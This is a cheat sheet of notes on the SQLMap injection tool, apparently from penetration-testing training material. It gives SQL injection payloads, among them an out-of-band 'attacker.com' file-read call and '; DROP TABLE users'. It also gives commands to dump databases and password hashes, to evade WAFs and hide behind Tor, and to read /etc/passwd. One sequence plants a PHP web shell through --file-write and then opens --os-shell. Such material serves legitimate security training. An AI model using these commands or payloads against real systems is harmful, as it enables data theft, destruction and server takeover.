# SQLMap

```shell-session
python sqlmap.py -u 'http://inlanefreight.htb/page.php?id=5'
```

### SQLMap Installation

```shell-session
sudo apt install sqlmap
git clone --depth 1 https://github.com/sqlmapproject/sqlmap.git sqlmap-dev
python sqlmap.py
```

### Supported Databases

> SQLMap has the largest support for DBMSes of any other SQL exploitation tool. SQLMap fully supports the following DBMSes:

|                    |                      |                    |                        |
| ------------------ | -------------------- | ------------------ | ---------------------- |
| `MySQL`            | `Oracle`             | `PostgreSQL`       | `Microsoft SQL Server` |
| `SQLite`           | `IBM DB2`            | `Microsoft Access` | `Firebird`             |
| `Sybase`           | `SAP MaxDB`          | `Informix`         | `MariaDB`              |
| `HSQLDB`           | `CockroachDB`        | `TiDB`             | `MemSQL`               |
| `H2`               | `MonetDB`            | `Apache Derby`     | `Amazon Redshift`      |
| `Vertica`, `Mckoi` | `Presto`             | `Altibase`         | `MimerSQL`             |
| `CrateDB`          | `Greenplum`          | `Drizzle`          | `Apache Ignite`        |
| `Cubrid`           | `InterSystems Cache` | `IRIS`             | `eXtremeDB`            |
| `FrontBase`        |                      |                    |                        |

> The SQLMap team also works to add and support new DBMSes periodically.

### Supported SQL Injection Types

```shell-session
sqlmap -hh
```

> The technique characters `BEUSTQ` refers to the following:
>
> * `B`: Boolean-based blind
> * `E`: Error-based
> * `U`: Union query-based
> * `S`: Stacked queries
> * `T`: Time-based blind
> * `Q`: Inline queries

### Boolean-based blind SQL Injection

```sql
AND 1=1
```

### Error-based SQL Injection

```sql
AND GTID_SUBSET(@@version,0)
```

### UNION query-based

```sql
UNION ALL SELECT 1,@@version,3
```

### Stacked queries

```sql
; DROP TABLE users
```

### Time-based blind SQL Injection

```sql
AND 1=IF(2>1,SLEEP(5),0)
```

### Inline queries

```sql
SELECT (SELECT @@version) from
```

### Out-of-band SQL Injection

```sql
LOAD_FILE(CONCAT('\\\\',@@version,'.attacker.com\\README.txt'))
```

## Getting Started with SQLMap

```shell-session
sqlmap -u "http://www.example.com/vuln.php?id=1" --batch
```



    ---

# Building Attacks

## 1.Running SQLMap on an HTTP Request

### Curl Commands

<figure><img src="https://27438919-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2FXIPxco87mgI3Ma3yEBLL%2Fuploads%2F0yOYvLRJKnK27NHMuyG2%2Fimage.png?alt=media&amp;token=9d529d91-1694-4012-8c31-ecabb9a4659d" alt=""><figcaption></figcaption></figure>

```shell-session
sqlmap 'http://www.example.com/?id=1' -H 'User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:80.0) Gecko/20100101 Firefox/80.0' -H 'Accept: image/webp,*/*' -H 'Accept-Language: en-US,en;q=0.5' --compressed -H 'Connection: keep-alive' -H 'DNT: 1'
```

## GET/POST Requests

```shell-session
sqlmap 'http://www.example.com/' --data 'uid=1&name=test'

 sqlmap 'http://www.example.com/' --data 'uid=1*&name=test'
```

## Full HTTP Requests

<figure><img src="https://27438919-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2FXIPxco87mgI3Ma3yEBLL%2Fuploads%2F1U4gJ9fX5rVQMa6kfwqV%2Fimage.png?alt=media&amp;token=421474af-6a20-413c-8dff-940111950d51" alt=""><figcaption></figcaption></figure>

```shell-session
sqlmap -r req.txt
```

## Custom SQLMap Requests

```shell-session
sqlmap ... --cookie='PHPSESSID=ab4530f4a7d10448457fa8b0eadac29c'

sqlmap ... -H='Cookie:PHPSESSID=ab4530f4a7d10448457fa8b0eadac29c'

sqlmap -u www.target.com --data='id=1' --method PUT
```

## Custom HTTP Requests

```shell-session
cat req.txt
HTTP / HTTP/1.0
Host: www.example.com

{
  "data": [{
    "type": "articles",
    "id": "1",
    "attributes": {
      "title": "Example JSON",
      "body": "Just an example",
      "created": "2020-05-22T14:56:29.000Z",
      "updated": "2020-05-22T14:56:28.000Z"
    },
    "relationships": {
      "author": {
        "data": {"id": "42", "type": "user"}
      }
    }
  }]
}
```

```shell-session
sqlmap -r req.txt
```

## 2.Handling SQLMap Errors

### Store the Traffic

```shell-session
sqlmap -u "http://www.target.com/vuln.php?id=1" --batch -t /tmp/traffic.txt
```

### Verbose Output

```shell-session
sqlmap -u "http://www.target.com/vuln.php?id=1" -v 6 --batch
```

### Using Proxy

> Finally, we can utilize the `--proxy` option to redirect the whole traffic through a (MiTM) proxy (e.g., `Burp`). This will route all SQLMap traffic through `Burp`, so that we can later manually investigate all requests, repeat them, and utilize all features of `Burp` with these requests:

![HTTP history showing GET requests to www.example.com with various parameters, including SQL injection attempts, and a 200 status code.](https://academy.hackthebox.com/storage/modules/58/eIwJeV3.png)

## 3.Attack Tuning

## Prefix/Suffix

```bash
sqlmap -u "www.example.com/?q=test" --prefix="%'))" --suffix="-- -"
```

### Level/Risk

> For such demands, the options `--level` and `--risk` should be used:
>
> * The option `--level` (`1-5`, default `1`) extends both vectors and boundaries being used, based on their expectancy of success (i.e., the lower the expectancy, the higher the level).
> * The option `--risk` (`1-3`, default `1`) extends the used vector set based on their risk of causing problems at the target side (i.e., risk of database entry loss or denial-of-service).

```shell-session
  sqlmap -u www.example.com/?id=1 -v 3 --level=5
  sqlmap -u www.example.com/?id=1 -v 3
  sqlmap -u www.example.com/?id=1
  sqlmap -u www.example.com/?id=1 --level=5 --risk=3
```

### Advanced Tuning

To further fine-tune the detection mechanism, there is a hefty set of switches and options. In regular cases, SQLMap will not require its usage. Still, we need to be familiar with them so that we could use them when needed.

**Status Codes**

For example, when dealing with a huge target response with a lot of dynamic content, subtle differences between `TRUE` and `FALSE` responses could be used for detection purposes. If the difference between `TRUE` and `FALSE` responses can be seen in the HTTP codes (e.g. `200` for `TRUE` and `500` for `FALSE`), the option `--code` could be used to fixate the detection of `TRUE` responses to a specific HTTP code (e.g. `--code=200`).

**Titles**

If the difference between responses can be seen by inspecting the HTTP page titles, the switch `--titles` could be used to instruct the detection mechanism to base the comparison based on the content of the HTML tag `<title>`.

**Strings**

In case of a specific string value appearing in `TRUE` responses (e.g. `success`), while absent in `FALSE` responses, the option `--string` could be used to fixate the detection based only on the appearance of that single value (e.g. `--string=success`).

**Text-only**

When dealing with a lot of hidden content, such as certain HTML page behaviors tags (e.g. `<script>`, `<style>`, `<meta>`, etc.), we can use the `--text-only` switch, which removes all the HTML tags, and bases the comparison only on the textual (i.e., visible) content.

**Techniques**

In some special cases, we have to narrow down the used payloads only to a certain type. For example, if the time-based blind payloads are causing trouble in the form of response timeouts, or if we want to force the usage of a specific SQLi payload type, the option `--technique` can specify the SQLi technique to be used.

For example, if we want to skip the time-based blind and stacking SQLi payloads and only test for the boolean-based blind, error-based, and UNION-query payloads, we can specify these techniques with `--technique=BEU`.

**UNION SQLi Tuning**

In some cases, `UNION` SQLi payloads require extra user-provided information to work. If we can manually find the exact number of columns of the vulnerable SQL query, we can provide this number to SQLMap with the option `--union-cols` (e.g. `--union-cols=17`). In case that the default "dummy" filling values used by SQLMap -`NULL` and random integer- are not compatible with values from results of the vulnerable SQL query, we can specify an alternative value instead (e.g. `--union-char='a'`).

Furthermore, in case there is a requirement to use an appendix at the end of a `UNION` query in the form of the `FROM <table>` (e.g., in case of Oracle), we can set it with the option `--union-from` (e.g. `--union-from=users`).\
Failing to use the proper `FROM` appendix automatically could be due to the inability to detect the DBMS name before its usage.



    ---

# Database Enumeration

## SQLMap Data Exfiltration

```xml
<?xml version="1.0" encoding="UTF-8"?>

<root>
    <dbms value="MySQL">
        <!-- http://dba.fyicenter.com/faq/mysql/Difference-between-CHAR-and-NCHAR.html -->
        <cast query="CAST(%s AS NCHAR)"/>
        <length query="CHAR_LENGTH(%s)"/>
        <isnull query="IFNULL(%s,' ')"/>
...SNIP...
        <banner query="VERSION()"/>
        <current_user query="CURRENT_USER()"/>
        <current_db query="DATABASE()"/>
        <hostname query="@@HOSTNAME"/>
        <table_comment query="SELECT table_comment FROM INFORMATION_SCHEMA.TABLES WHERE table_schema='%s' AND table_name='%s'"/>
        <column_comment query="SELECT column_comment FROM INFORMATION_SCHEMA.COLUMNS WHERE table_schema='%s' AND table_name='%s' AND column_name='%s'"/>
        <is_dba query="(SELECT super_priv FROM mysql.user WHERE user='%s' LIMIT 0,1)='Y'"/>
        <check_udf query="(SELECT name FROM mysql.func WHERE name='%s' LIMIT 0,1)='%s'"/>
        <users>
            <inband query="SELECT grantee FROM INFORMATION_SCHEMA.USER_PRIVILEGES" query2="SELECT user FROM mysql.user" query3="SELECT username FROM DATA_DICTIONARY.CUMULATIVE_USER_STATS"/>
            <blind query="SELECT DISTINCT(grantee) FROM INFORMATION_SCHEMA.USER_PRIVILEGES LIMIT %d,1" query2="SELECT DISTINCT(user) FROM mysql.user LIMIT %d,1" query3="SELECT DISTINCT(username) FROM DATA_DICTIONARY.CUMULATIVE_USER_STATS LIMIT %d,1" count="SELECT COUNT(DISTINCT(grantee)) FROM INFORMATION_SCHEMA.USER_PRIVILEGES" count2="SELECT COUNT(DISTINCT(user)) FROM mysql.user" count3="SELECT COUNT(DISTINCT(username)) FROM DATA_DICTIONARY.CUMULATIVE_USER_STATS"/>
        </users>
    ...SNIP...
```

### Basic DB Data Enumeration

```shell-session
sqlmap -u "http://www.example.com/?id=1" --banner --current-user --current-db --is-dba
```

### Table Enumeration

```shell-session
sqlmap -u "http://www.example.com/?id=1" --tables -D testdb
```

```shell-session
qlmap -u "http://www.example.com/?id=1" --dump -T users -D testdb
```

<figure><img src="https://27438919-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2FXIPxco87mgI3Ma3yEBLL%2Fuploads%2FZlHKU2z2of5jYRWlCkJK%2Fimage.png?alt=media&amp;token=79762899-48b0-440a-8e1a-77f9c7d22880" alt=""><figcaption></figcaption></figure>

## Table/Row Enumeration

```shell-session
sqlmap -u "http://www.example.com/?id=1" --dump -T users -D testdb -C name,surname
```

```shell-session
sqlmap -u "http://www.example.com/?id=1" --dump -T users -D testdb --start=2 --stop=3
```

### Conditional Enumeration

```shell-session
sqlmap -u "http://www.example.com/?id=1" --dump -T users -D testdb --where="name LIKE 'f%'"
```

## Full DB Enumeration

Instead of retrieving content per single-table basis, we can retrieve all tables inside the database of interest by skipping the usage of option `-T` altogether (e.g. `--dump -D testdb`). By simply using the switch `--dump` without specifying a table with `-T`, all of the current database content will be retrieved. As for the `--dump-all` switch, all the content from all the databases will be retrieved.

In such cases, a user is also advised to include the switch `--exclude-sysdbs` (e.g. `--dump-all --exclude-sysdbs`), which will instruct SQLMap to skip the retrieval of content from system databases, as it is usually of little interest for pentesters.

## 2.Advanced Database Enumeration

### DB Schema Enumeration

```shell-session
sqlmap -u "http://www.example.com/?id=1" --schema
```

### Searching for Data

```shell-session
sqlmap -u "http://www.example.com/?id=1" --search -T user
```

```shell-session
sqlmap -u "http://www.example.com/?id=1" --search -C pass
```

## Password Enumeration and Cracking

Once we identify a table containing passwords (e.g. master.users), we can retrieve that table with the -T option, as previously shown:

```shell-session
sqlmap -u "http://www.example.com/?id=1" --dump -D master -T users
```

## DB Users Password Enumeration and Cracking

```shell-session
 sqlmap -u "http://www.example.com/?id=1" --passwords --batch
```

> Tip: The '--all' switch in combination with the '--batch' switch, will automa(g)ically do the whole enumeration process on the target itself, and provide the entire enumeration details.



    ---

# Advanced SQLMap Usage

## 1.Bypassing Web Application Protections

```shell-session
sqlmap -u "http://www.example.com/" --data="id=1&csrf-token=WfF1szMUHhiokx9AHFply5L2xAOfjRkE" --csrf-token="csrf-token"
```

### Unique Value Bypass

```shell-session
sqlmap -u "http://www.example.com/?id=1&rp=29125" --randomize=rp --batch -v 5 | grep URI
```

## Calculated Parameter Bypass

```shell-session
sqlmap -u "http://www.example.com/?id=1&h=c4ca4238a0b923820dcc509a6f75849b" --eval="import hashlib; h=hashlib.md5(id).hexdigest()" --batch -v 5 | grep URI
```

### IP Address Concealing

In case we want to conceal our IP address, or if a certain web application has a protection mechanism that blacklists our current IP address, we can try to use a proxy or the anonymity network Tor. A proxy can be set with the option `--proxy` (e.g. `--proxy="socks4://177.39.187.70:33283"`), where we should add a working proxy.

In addition to that, if we have a list of proxies, we can provide them to SQLMap with the option `--proxy-file`. This way, SQLMap will go sequentially through the list, and in case of any problems (e.g., blacklisting of IP address), it will just skip from current to the next from the list. The other option is Tor network use to provide an easy to use anonymization, where our IP can appear anywhere from a large list of Tor exit nodes. When properly installed on the local machine, there should be a `SOCKS4` proxy service at the local port 9050 or 9150. By using switch `--tor`, SQLMap will automatically try to find the local port and use it appropriately.

If we wanted to be sure that Tor is properly being used, to prevent unwanted behavior, we could use the switch `--check-tor`. In such cases, SQLMap will connect to the `https://check.torproject.org/` and check the response for the intended result (i.e., `Congratulations` appears inside).

***

### WAF Bypass

Whenever we run SQLMap, As part of the initial tests, SQLMap sends a predefined malicious looking payload using a non-existent parameter name (e.g. `?pfov=...`) to test for the existence of a WAF (Web Application Firewall). There will be a substantial change in the response compared to the original in case of any protection between the user and the target. For example, if one of the most popular WAF solutions (ModSecurity) is implemented, there should be a `406 - Not Acceptable` response after such a request.

In case of a positive detection, to identify the actual protection mechanism, SQLMap uses a third-party library [identYwaf](https://github.com/stamparm/identYwaf), containing the signatures of 80 different WAF solutions. If we wanted to skip this heuristical test altogether (i.e., to produce less noise), we can use switch `--skip-waf`.

***

### User-agent Blacklisting Bypass

In case of immediate problems (e.g., HTTP error code 5XX from the start) while running SQLMap, one of the first things we should think of is the potential blacklisting of the default user-agent used by SQLMap (e.g. `User-agent: sqlmap/1.4.9 (http://sqlmap.org)`).

This is trivial to bypass with the switch `--random-agent`, which changes the default user-agent with a randomly chosen value from a large pool of values used by browsers.

Note: If some form of protection is detected during the run, we can expect problems with the target, even other security mechanisms. The main reason is the continuous development and new improvements in such protections, leaving smaller and smaller maneuver space for attackers.

***

### Tamper Scripts

Finally, one of the most popular mechanisms implemented in SQLMap for bypassing WAF/IPS solutions is the so-called "tamper" scripts. Tamper scripts are a special kind of (Python) scripts written for modifying requests just before being sent to the target, in most cases to bypass some protection.

For example, one of the most popular tamper scripts [between](https://github.com/sqlmapproject/sqlmap/blob/master/tamper/between.py) is replacing all occurrences of greater than operator (`>`) with `NOT BETWEEN 0 AND #`, and the equals operator (`=`) with `BETWEEN # AND #`. This way, many primitive protection mechanisms (focused mostly on preventing XSS attacks) are easily bypassed, at least for SQLi purposes.

Tamper scripts can be chained, one after another, within the `--tamper` option (e.g. `--tamper=between,randomcase`), where they are run based on their predefined priority. A priority is predefined to prevent any unwanted behavior, as some scripts modify payloads by modifying their SQL syntax (e.g. [ifnull2ifisnull](https://github.com/sqlmapproject/sqlmap/blob/master/tamper/ifnull2ifisnull.py)). In contrast, some tamper scripts do not care about the inner content (e.g. [appendnullbyte](https://github.com/sqlmapproject/sqlmap/blob/master/tamper/appendnullbyte.py)).

Tamper scripts can modify any part of the request, although the majority change the payload content. The most notable tamper scripts are the following:

| **Tamper-Script**           | **Description**                                                                                                                  |
| --------------------------- | -------------------------------------------------------------------------------------------------------------------------------- |
| `0eunion`                   | Replaces instances of UNION with e0UNION                                                                                         |
| `base64encode`              | Base64-encodes all characters in a given payload                                                                                 |
| `between`                   | Replaces greater than operator (`>`) with `NOT BETWEEN 0 AND #` and equals operator (`=`) with `BETWEEN # AND #`                 |
| `commalesslimit`            | Replaces (MySQL) instances like `LIMIT M, N` with `LIMIT N OFFSET M` counterpart                                                 |
| `equaltolike`               | Replaces all occurrences of operator equal (`=`) with `LIKE` counterpart                                                         |
| `halfversionedmorekeywords` | Adds (MySQL) versioned comment before each keyword                                                                               |
| `modsecurityversioned`      | Embraces complete query with (MySQL) versioned comment                                                                           |
| `modsecurityzeroversioned`  | Embraces complete query with (MySQL) zero-versioned comment                                                                      |
| `percentage`                | Adds a percentage sign (`%`) in front of each character (e.g. SELECT -> %S%E%L%E%C%T)                                            |
| `plus2concat`               | Replaces plus operator (`+`) with (MsSQL) function CONCAT() counterpart                                                          |
| `randomcase`                | Replaces each keyword character with random case value (e.g. SELECT -> SEleCt)                                                   |
| `space2comment`             | Replaces space character ( ) with comments \`/                                                                                   |
| `space2dash`                | Replaces space character ( ) with a dash comment (`--`) followed by a random string and a new line (`\n`)                        |
| `space2hash`                | Replaces (MySQL) instances of space character ( ) with a pound character (`#`) followed by a random string and a new line (`\n`) |
| `space2mssqlblank`          | Replaces (MsSQL) instances of space character ( ) with a random blank character from a valid set of alternate characters         |
| `space2plus`                | Replaces space character ( ) with plus (`+`)                                                                                     |
| `space2randomblank`         | Replaces space character ( ) with a random blank character from a valid set of alternate characters                              |
| `symboliclogical`           | Replaces AND and OR logical operators with their symbolic counterparts (`&&` and `\|\|`)                                         |
| `versionedkeywords`         | Encloses each non-function keyword with (MySQL) versioned comment                                                                |
| `versionedmorekeywords`     | Encloses each keyword with (MySQL) versioned comment                                                                             |

To get a whole list of implemented tamper scripts, along with the description as above, switch `--list-tampers` can be used. We can also develop custom Tamper scripts for any custom type of attack, like a second-order SQLi.

***

### Miscellaneous Bypasses

Out of other protection bypass mechanisms, there are also two more that should be mentioned. The first one is the `Chunked` transfer encoding, turned on using the switch `--chunked`, which splits the POST request's body into so-called "chunks." Blacklisted SQL keywords are split between chunks in a way that the request containing them can pass unnoticed.

The other bypass mechanisms is the `HTTP parameter pollution` (`HPP`), where payloads are split in a similar way as in case of `--chunked` between different same parameter named values (e.g. `?id=1&id=UNION&id=SELECT&id=username,password&id=FROM&id=users...`), which are concatenated by the target platform if supporting it (e.g. `ASP`).

## 2.OS Exploitation

## Checking for DBA Privileges

```shell-session
sqlmap -u "http://www.example.com/case1.php?id=1" --is-dba
sqlmap -u "http://www.example.com/?id=1" --is-dba
```

### Reading Local Files

```shell-session
sqlmap -u "http://www.example.com/?id=1" --file-read "/etc/passwd"
```

```shell-session
cat ~/.sqlmap/output/www.example.com/files/_etc_passwd
```

### Writing Local Files

```shell-session
echo '<?php system($_GET["cmd"]); ?>' > shell.php
```

```shell-session
sqlmap -u "http://www.example.com/?id=1" --file-write "shell.php" --file-dest "/var/www/html/shell.php"
```

```shell-session
 curl http://www.example.com/shell.php?cmd=ls+-la
```

### OS Command Execution

```shell-session
sqlmap -u "http://www.example.com/?id=1" --os-shell
```

```shell-session
sqlmap -u "http://www.example.com/?id=1" --os-shell --technique=E
```
